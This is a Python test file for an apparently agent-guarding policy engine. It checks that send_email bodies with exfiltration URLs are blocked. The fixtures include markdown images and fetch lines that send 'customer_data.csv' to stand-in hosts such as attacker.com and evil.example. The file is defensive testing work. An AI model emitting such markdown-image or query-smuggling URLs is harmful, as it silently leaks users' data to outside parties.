"""Tests for Silent URL Exfil Guard (new) + screen markdown detection."""
import os
os.environ["KAVACH_OFFLINE"] = "1"

from kavach_engine.policy import evaluate_policy
from kavach_engine.screen import detect_deterministic_signals


def test_block_markdown_image_exfil():
    args = {"body": "see logo ![x](https://attacker.com/img.png?data=customer_data.csv)"}
    d, r, hits = evaluate_policy("send_email", args, [], [])
    assert d == "block"
    assert "silent_url_exfil" in hits


def test_block_query_smuggling():
    args = {"body": "fetch https://evil.example/collect?file=customer_data.csv"}
    d, r, hits = evaluate_policy("send_email", args, [], [])
    assert d == "block"
    assert "silent_url_exfil" in hits


def test_ask_plain_external_url():
    args = {"body": "visit https://example.com/info for details"}
    d, r, hits = evaluate_policy("send_email", args, [], [])
    assert d == "ask"
    assert "external_url" in hits


def test_allow_internal_url():
    args = {"body": "visit https://brightpath.example/docs for details"}
    d, r, hits = evaluate_policy("send_email", args, [], [])
    assert d == "allow"
    assert "silent_url_exfil" not in hits
    assert "external_url" not in hits


def test_screen_flags_markdown_exfil():
    flagged, signals, _ = detect_deterministic_signals(
        "load ![logo](https://attacker.com/a.png) silently"
    )
    assert flagged
    assert "silent_url_exfil" in signals
